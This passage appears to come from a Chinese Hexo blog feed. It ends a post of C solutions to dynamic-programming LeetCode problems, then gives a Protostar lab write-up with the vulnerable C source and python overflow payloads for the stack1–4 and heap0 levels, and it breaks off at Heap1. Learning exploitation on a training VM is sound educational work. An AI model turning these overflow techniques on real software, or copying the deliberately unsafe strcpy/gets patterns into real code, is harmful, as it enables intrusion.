class="hljs-number">1</span>][j]) + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n1][n2];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-买卖股票的最佳时机"><a href="#8-买卖股票的最佳时机" class="headerlink" title="8.买卖股票的最佳时机"></a>8.买卖股票的最佳时机</h2><h3 id="8-1题目描述"><a href="#8-1题目描述" class="headerlink" title="8.1题目描述"></a>8.1题目描述</h3><p>给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。</p><p>设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。</p><p>注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p><p><strong>示例 1:</strong></p><p>输入: [3,3,5,0,0,3,1,4]<br>输出: 6<br>解释: 在第 4 天（股票价格 &#x3D; 0）的时候买入，在第 6 天（股票价格 &#x3D; 3）的时候卖出，这笔交易所能获得利润 &#x3D; 3-0 &#x3D; 3 。</p><p>随后，在第 7 天（股票价格 &#x3D; 1）的时候买入，在第 8 天 （股票价格 &#x3D; 4）的时候卖出，这笔交易所能获得利润 &#x3D; 4-1 &#x3D; 3 。</p><p><strong>示例 2:</strong></p><p>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 &#x3D; 1）的时候买入，在第 5 天 （股票价格 &#x3D; 5）的时候卖出, 这笔交易所能获得利润 &#x3D; 5-1 &#x3D; 4 。<br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。<br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</p><p><strong>示例 3:</strong></p><p>输入: [7,6,4,3,1]<br>输出: 0<br>解释: 在这个情况下, 没有交易完成, 所以最大利润为 0。</p><p>来源：<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii</a></p><h3 id="8-2思路分析"><a href="#8-2思路分析" class="headerlink" title="8.2思路分析"></a>8.2思路分析</h3><p>每天我们其实是有四个状态，买入当前价格的股票，以当前价格的股票卖出。第二次买入股票，第二次卖出股票。</p><p><img src="/%5Cimages%5Cdp8.jpg"></p><p>s0代表初始状态，初始时钱是 0。s1代表第一次买入后当前的钱，s2代表第一次卖出后当前的前，s3代表第二次买入后当前的钱，s4代表第二次卖出后当前的钱。然后我们只需要更新每天的这四个状态即可。</p><h3 id="8-3代码"><a href="#8-3代码" class="headerlink" title="8.3代码"></a>8.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> max(a,b) (a&gt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxProfit</span><span class="hljs-params">(<span class="hljs-type">int</span>* prices, <span class="hljs-type">int</span> pricesSize)</span>&#123;<br>    <span class="hljs-keyword">if</span>(pricesSize == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//进行初始化，第一天 s1 将股票买入，其他状态全部初始化为最小值</span><br>    <span class="hljs-type">int</span> s1=-prices[<span class="hljs-number">0</span>],s2=<span class="hljs-number">-2147483648</span>,s3=<span class="hljs-number">-2147483648</span>,s4=<span class="hljs-number">-2147483648</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;pricesSize;++i) &#123;            <br>        s1 = max(s1, -prices[i]); <span class="hljs-comment">//买入价格更低的股</span><br>        s2 = max(s2, s1+prices[i]); <span class="hljs-comment">//卖出当前股，或者不操作</span><br>        s3 = max(s3, s2-prices[i]); <span class="hljs-comment">//第二次买入，或者不操作</span><br>        s4 = max(s4, s3+prices[i]); <span class="hljs-comment">//第二次卖出，或者不操作</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> max(<span class="hljs-number">0</span>,s4);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-三角形最小路径和"><a href="#9-三角形最小路径和" class="headerlink" title="9.三角形最小路径和"></a>9.三角形最小路径和</h2><h3 id="9-1题目描述"><a href="#9-1题目描述" class="headerlink" title="9.1题目描述"></a>9.1题目描述</h3><p>给定一个三角形，找出自顶向下的最小路径和。每一步只能移动到下一行中相邻的结点上。</p><p>例如，给定三角形：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[</span><br><span class="hljs-comment">     <span class="hljs-comment">[2]</span>,</span><br><span class="hljs-comment">    <span class="hljs-comment">[3,4]</span>,</span><br><span class="hljs-comment">   <span class="hljs-comment">[6,5,7]</span>,</span><br><span class="hljs-comment">  <span class="hljs-comment">[4,1,8,3]</span></span><br><span class="hljs-comment">]</span><br></code></pre></td></tr></table></figure><p>自顶向下的最小路径和为 11（即，2 + 3 + 5 + 1 &#x3D; 11）。</p><p>来源：<a href="https://leetcode-cn.com/problems/triangle">https://leetcode-cn.com/problems/triangle</a></p><h3 id="9-2思路"><a href="#9-2思路" class="headerlink" title="9.2思路"></a>9.2思路</h3><p>从倒数第二行开始计算每个数字到下一个节点的最小值，并加上当前节点值存入当前节点，最后triangle[0][0]中存储的就是最终的最短路径结果。</p><h3 id="9-3代码"><a href="#9-3代码" class="headerlink" title="9.3代码"></a>9.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b) (a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minimumTotal</span><span class="hljs-params">(<span class="hljs-type">int</span>** triangle, <span class="hljs-type">int</span> triangleSize, <span class="hljs-type">int</span>* triangleColSize)</span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br><span class="hljs-comment">//自底向上</span><br>    <span class="hljs-keyword">for</span>(i = triangleSize<span class="hljs-number">-2</span>;i &gt;= <span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>;j &lt; triangleColSize[i];j++ )&#123;<br>            triangle[i][j] = min(triangle[i+<span class="hljs-number">1</span>][j],triangle[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>])+triangle[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> triangle[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-最大正方形"><a href="#10-最大正方形" class="headerlink" title="10.最大正方形"></a>10.最大正方形</h2><h3 id="10-1题目描述"><a href="#10-1题目描述" class="headerlink" title="10.1题目描述"></a>10.1题目描述</h3><p>在一个由 0 和 1 组成的二维矩阵内，找到只包含 1 的最大正方形，并返回其面积。</p><p>示例:</p><p>输入: </p><p>1 0 1 0 0<br>1 0 1 1 1<br>1 1 1 1 1<br>1 0 0 1 0</p><p>输出: 4</p><p>来源：<a href="https://leetcode-cn.com/problems/maximal-square">https://leetcode-cn.com/problems/maximal-square</a></p><h3 id="10-2思路分析"><a href="#10-2思路分析" class="headerlink" title="10.2思路分析"></a>10.2思路分析</h3><p>第一想法就是使用动态规划算法，将dp初始化为全零（不初始化直接用会导致测试时出错），如果当前点是1，然后dp[i][j] 取左侧、左上角、上侧最小值加一为当前点dp值，如果当前dp值大于maxqlen就将maxqlen置为当前dp值。最后返回maxqlen*maxqlen即可。中间最开始看错了输汝，以为矩阵里面是整形导致一直判断出错，要细心啊。</p><h3 id="10-3代码"><a href="#10-3代码" class="headerlink" title="10.3代码"></a>10.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> max(a,b) (a&gt;b?a:b)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b) (a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maximalSquare</span><span class="hljs-params">(<span class="hljs-type">char</span>** matrix, <span class="hljs-type">int</span> matrixSize, <span class="hljs-type">int</span>* matrixColSize)</span>&#123;<br>    <span class="hljs-keyword">if</span>(matrixSize == <span class="hljs-number">0</span> || *matrixColSize ==  <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> rows = matrixSize, cols = *matrixColSize;<br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">400</span>][<span class="hljs-number">400</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> maxsqlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= rows; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= cols; j++) &#123;<br>            <span class="hljs-keyword">if</span> (matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                dp[i][j] = min(min(dp[i][j - <span class="hljs-number">1</span>], dp[i - <span class="hljs-number">1</span>][j]), dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>;<br>                maxsqlen = max(maxsqlen, dp[i][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxsqlen * maxsqlen;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>DP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞利用练习:Protostar(V2)</title>
    <link href="/blog/2020/03/13/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0-Protostar-V2/"/>
    <url>/blog/2020/03/13/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0-Protostar-V2/</url>
    
    <content type="html"><![CDATA[<p><strong>学习了软件安全课程后，初步了解了一下堆栈溢出，觉得还不够，练习一下玩玩，感觉挺好玩的。</strong></p><p><img src="/images/fj34.jpg"></p><span id="more"></span><h2 id="0x00实验环境搭建"><a href="#0x00实验环境搭建" class="headerlink" title="0x00实验环境搭建"></a>0x00实验环境搭建</h2><h3 id="镜像下载"><a href="#镜像下载" class="headerlink" title="镜像下载"></a>镜像下载</h3><p>在这里有iso镜像下载的链接：</p><p><a href="">https : &#x2F;&#x2F;download.vulnhub.com&#x2F;exploitexercises&#x2F;exploit-exercises-protostar-2.iso</a></p><h3 id="镜像安装"><a href="#镜像安装" class="headerlink" title="镜像安装"></a>镜像安装</h3><p>直接使用vmware创建Linux虚拟机即可，然后用live模式启动即可，用户名<code>user</code>，密码<code>user</code>，root用户密码<code>godmode</code>。</p><p>练习的可执行文件在 &#x2F;opt&#x2F;protostar&#x2F;bin目录下，可以使用bash命令切换到bash后方便敲命令。</p><h2 id="0x01栈溢出"><a href="#0x01栈溢出" class="headerlink" title="0x01栈溢出"></a>0x01栈溢出</h2><h3 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h3><h4 id="0-源代码"><a href="#0-源代码" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> modified;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br><br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>) &#123;<br>        errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;please specify an argument\n&quot;</span>);<br>    &#125;<br>  <br>    modified = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>(buffer, argv[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">if</span>(modified == <span class="hljs-number">0x61626364</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have correctly got the variable to the right value\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Try again, you got 0x%08x\n&quot;</span>, modified);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-分析"><a href="#1-分析" class="headerlink" title="1 分析"></a>1 分析</h4><p>我们可以发现modified这个参数会比buffer更早入栈，然而栈中字符串是越靠后的字符越靠近栈底位置，buffer只有64位长度，而且strcpy函数不对参数进行长度检查，因此会导致溢出。假如我们输入64个字符之后后面跟的值是<strong>\x64\x63\x62\x61</strong> 这样的话，modified值就会被覆盖掉，引发栈溢出，从而把变量原来的值修改掉。</p><h4 id="2-解答"><a href="#2-解答" class="headerlink" title="2 解答"></a>2 解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*64+&#x27;\x64\x63\x62\x61&#x27;&quot;</span> | xargs ./stack1<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/images/stack1.png"></p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><h4 id="0-源代码-1"><a href="#0-源代码-1" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> modified;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br>    <span class="hljs-type">char</span> *variable;<br>    <br>    variable = getenv(<span class="hljs-string">&quot;GREENIE&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span>(variable == <span class="hljs-literal">NULL</span>) &#123;<br>    errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;please set the GREENIE environment variable\n&quot;</span>);<br>    &#125;<br><br>    modified = <span class="hljs-number">0</span>;<br> <br>    <span class="hljs-built_in">strcpy</span>(buffer, variable);<br>    <br>    <span class="hljs-keyword">if</span>(modified == <span class="hljs-number">0x0d0a0d0a</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have correctly modified the variable\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Try again, you got 0x%08x\n&quot;</span>, modified);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1 思路"></a>1 思路</h4><p>还是strcpy的锅，如果getenv函数获取的环境变量的值超出buffer的64位，会导致栈溢出，从而修改modified的值，我们只需要构造一个GREENIE环境变量，前64位是字符，后面跟着\x0a\x0d\x0a\x0d即可</p><h4 id="2-解答-1"><a href="#2-解答-1" class="headerlink" title="2 解答"></a>2 解答</h4><p>编写python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>envval = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">64</span> + <span class="hljs-string">&#x27;\x0a\x0d\x0a\x0d&#x27;</span><br>os.putenv(<span class="hljs-string">&quot;GREENIE&quot;</span>, envval)<br>os.system(<span class="hljs-string">&quot;./stack2&quot;</span>)<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/images/stack2.png"></p><h3 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h3><h4 id="0-源代码-2"><a href="#0-源代码-2" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;code flow successfully changed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*fp)</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br><br>    fp = <span class="hljs-number">0</span>;<br><br>    gets(buffer);<br><br>    <span class="hljs-keyword">if</span>(fp) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;calling function pointer, jumping to 0x%08x\n&quot;</span>, fp);<br>      fp();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路分析"><a href="#1-思路分析" class="headerlink" title="1 思路分析"></a>1 思路分析</h4><p>首先我们应该找到win函数的地址：</p><p>进入gdb之后：disassemble win</p><p><img src="/images/stack3-0.png"></p><p>发现win函数的地址是0x08048424，接下来我们就可以构造buffer的溢出，利用gets函数的漏洞，</p><p>覆盖掉原本fp指针的地址，让主函数执行我们想执行的函数。</p><h4 id="2-解答-2"><a href="#2-解答-2" class="headerlink" title="2 解答"></a>2 解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*64+&#x27;\x24\x84\x04\x08&#x27;&quot;</span> | ./stack3<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/images/stack3-1.png"></p><h3 id="stack4"><a href="#stack4" class="headerlink" title="stack4"></a>stack4</h3><h4 id="0-源代码-3"><a href="#0-源代码-3" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;code flow successfully changed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br>    gets(buffer);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-1"><a href="#1-思路-1" class="headerlink" title="1 思路"></a>1 思路</h4><p>首先根据已有知识，我们其实可以算出来main函数的返回地址在哪里，因为压栈顺序是从右向左两个参数，然后局部变量，所以栈里面的顺序应该是  高地址到低地址：main函数返回地址、char**型参数、int型参数、char buffer[64]。因此我们可以计算出来返回地址的位置在4+8+64&#x3D;76处。随后我是用gdb单步运行<code>i r</code>指令查看esp寄存器信息也验证了以上说法是正确的。</p><p>然后我们使用<strong>disas win</strong>查看win函数的地址：</p><p><img src="/images/stack4-0.png"></p><p>发现该函数地址为：0x080483f4</p><p>于是我们便可以利用gets函数的漏洞，修改76字符长度后面的main函数返回地址即可，注意使用小端序。</p><h4 id="2-解答-3"><a href="#2-解答-3" class="headerlink" title="2 解答"></a>2 解答</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*76 + &#x27;\xf4\x83\x04\x08&#x27;&quot;</span> | ./stack4<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/images/stack4-1.png"></p><h2 id="0x02-堆溢出"><a href="#0x02-堆溢出" class="headerlink" title="0x02 堆溢出"></a>0x02 堆溢出</h2><h3 id="Heap-0"><a href="#Heap-0" class="headerlink" title="Heap 0"></a>Heap 0</h3><h4 id="0-源代码-4"><a href="#0-源代码-4" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">winner</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;level passed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nowinner</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;level has not been passed\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> *<span class="hljs-title">d</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fp</span> *<span class="hljs-title">f</span>;</span><br><br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> data));<br>    f = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fp));<br>    f-&gt;fp = nowinner;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data is at %p, fp is at %p\n&quot;</span>, d, f);<br><br>    <span class="hljs-built_in">strcpy</span>(d-&gt;name, argv[<span class="hljs-number">1</span>]);<br><br>    f-&gt;fp();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-2"><a href="#1-思路-2" class="headerlink" title="1 思路"></a>1 思路</h4><p>从代码中我们可以看出，64 字节的堆内存被用于 struct 的名字，4 个字节用于 struct fp。而 nowinner 的函数指针则被放在了堆内存中。接着，我们的输入会通过有漏洞的 strcpy 函数拷入到 struct 数据的 name 变量中。所以，我们可以放心地假设，在64字节之后的空间中我们可以将函数指针重写到 nowinner 函数中。</p><p>当我们进一步逆向主程序并分析后，发现 malloc 被用于分配64字节的空间。然而，它多分配了8个字节（0x00000049），其中前4个字节表示 prev_size 数据（如果前一个块(chunk)的空间是空的则为前一个块空间的大小，否则为前一个块的用户数据）。另外4个字节的用于表示被分配块的大小，其中3LSB的bit用于不同的标志(PREV_INUSE [0x1], IS_MAPPED [0x2], NON_MAIN_ARENA [0x4])，这些标志是用于描述前一个块空间的，要在 gdb 中获取堆内存的起始地址，可以使用 info proc mapping 命令</p><p>首先我们运行一下即可看到data is at 0x804a008, fp is at 0x804a050，也可以看出来我们需要copy 72字节数据来实现堆溢出，72 字节后面就是nowinner地址，我们需要将这个地址替换为winner的地址。</p><p>使用GDB，disas winner查看winner函数的地址为0x08048464。然后我们就可以构造输出，改变原本的堆的结构。</p><p><img src="/images/heap0-0.png"></p><h4 id="2-解答-4"><a href="#2-解答-4" class="headerlink" title="2.解答"></a>2.解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*72 + &#x27;\x64\x84\x04\x08&#x27;&quot;</span> |xargs ./heap0<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/images/heap0-1.png"></p><h3 id="Heap1"><a href="#Heap1" class="headerlink" title="Heap1"></a>Heap1</h3><h4 id="0-源代码-5"><a href="#0-源代码-5" class="headerlink" title="0 源代码"></a>0 源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 